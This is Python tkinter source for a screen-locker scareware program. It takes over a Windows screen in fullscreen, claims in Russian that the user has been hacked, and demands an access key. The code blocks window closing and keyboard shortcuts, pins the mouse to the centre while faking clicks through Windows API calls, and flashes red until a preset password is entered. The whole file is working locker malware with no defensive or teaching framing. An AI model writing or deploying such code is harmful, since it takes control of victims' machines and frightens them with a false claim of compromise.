import ctypes
import os
import tkinter as tk
from tkinter import messagebox

PASSWORD = os.getenv("LOCKSCREEN_PASSWORD", "+ä-+ä-+ä-")

class LockScreen(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Zugriff gesperrt")
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)
        self.configure(bg="black")
        self.focus_force()

        self.protocol("WM_DELETE_WINDOW", lambda: None)
        self.bind("<Escape>", lambda event: "break")
        self.bind("<Alt-F4>", lambda event: "break")
        self.bind("<KeyPress>", lambda event: "break")

        # Maus in die Mitte zurücksetzen und alle 0.2s einen Klick simulieren
        self.bind("<Motion>", self.keep_mouse_centered)
        self.bind("<Button-1>", self.keep_mouse_centered)
        self.bind("<Button-2>", self.keep_mouse_centered)
        self.bind("<Button-3>", self.keep_mouse_centered)
        self.after(200, self.fake_click)
        self.after(50, self.center_mouse)

        self.red_mode = False
        self.after(1000, self.blink_background)

        self.label = tk.Label(
            self,
            text="Тебя взломали, введи ключ доступа, пожалуйста.",
            bg="black",
            fg="white",
            font=("Arial", 24, "bold")
        )
        self.label.pack(expand=True)

        frame = tk.Frame(self, bg="black")
        frame.pack(pady=20)

        tk.Label(frame, text="Passwort:", bg="black", fg="white", font=("Arial", 12)).pack()
        self.entry = tk.Entry(frame, width=30, font=("Arial", 12), show="*")
        self.entry.pack(pady=8)
        self.entry.focus_set()

        btn = tk.Button(
            frame,
            text="Bestätigen",
            command=self.check_password,
            width=20,
            font=("Arial", 11)
        )
        btn.pack(pady=10)

        self.bind("<Return>", lambda event: self.check_password())

    def center_mouse(self):
        try:
            width = ctypes.windll.user32.GetSystemMetrics(0)
            height = ctypes.windll.user32.GetSystemMetrics(1)
            ctypes.windll.user32.SetCursorPos(width // 2, height // 2)
        except Exception:
            pass
        self.after(50, self.center_mouse)

    def keep_mouse_centered(self, event=None):
        self.center_mouse()

    def fake_click(self):
        try:
            x = ctypes.windll.user32.GetSystemMetrics(0) // 2
            y = ctypes.windll.user32.GetSystemMetrics(1) // 2
            ctypes.windll.user32.SetCursorPos(x, y)
            ctypes.windll.user32.mouse_event(0x0002, x, y, 0, 0)  # left down
            ctypes.windll.user32.mouse_event(0x0004, x, y, 0, 0)  # left up
        except Exception:
            pass
        self.after(200, self.fake_click)

    def blink_background(self):
        self.red_mode = not self.red_mode
        if self.red_mode:
            color = "red"
            delay = 200
        else:
            color = "black"
            delay = 1000

        self.configure(bg=color)
        self.label.configure(bg=color, fg="white")
        self.after(delay, self.blink_background)

    def check_password(self):
        if PASSWORD is None:
            messagebox.showerror("Fehler", "Passwort nicht konfiguriert. Setze die Umgebungsvariable LOCKSCREEN_PASSWORD.")
            return

        if self.entry.get() == PASSWORD:
            self.destroy()
        else:
            messagebox.showerror("Fehler", "Falsches Passwort.")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()

if __name__ == "__main__":
    app = LockScreen()
    app.mainloop()